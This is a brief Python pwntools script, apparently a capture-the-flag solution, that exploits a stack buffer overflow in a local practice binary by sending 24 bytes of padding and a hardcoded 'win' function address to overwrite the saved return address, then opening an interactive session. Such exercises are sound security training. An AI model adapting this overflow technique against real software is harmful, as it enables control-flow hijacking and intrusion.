#!/bin/python3

from pwn import *
context(arch="amd64")

p = process("./pwna")

win_address = p64(0x401142) # we get the address of the function using IDA/Ghidra for example
payload = b'A'*24 + win_address # 16 chars of buffer + 8 of saved RBP = 24 bytes (= to overwrite saved RIP)

print(p.recvline())
p.sendline(payload)
p.interactive()
